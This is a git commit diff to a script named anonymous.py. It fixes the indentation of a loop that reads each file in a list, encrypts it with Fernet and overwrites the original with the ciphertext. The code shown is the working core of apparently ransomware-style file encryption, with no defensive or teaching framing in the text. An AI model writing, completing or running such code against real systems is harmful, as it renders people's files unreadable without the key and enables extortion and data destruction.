fc0a58cfea3ad57bfc2d1665f79e5d397880f808
PythonPractices1 <68774207+PythonPractices1@users.noreply.github.com>
2022-09-09 16:55:36 +0300

    Update anonymous.py

--- anonymous.py
+++ anonymous.py
@@ -21,7 +21,7 @@ for file in files:
     with open(file,"rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
-        with open(file,"wb") as thefile:
-            thefile.write(contents_encrypted)
+    with open(file,"wb") as thefile:
+        thefile.write(contents_encrypted)
             
 
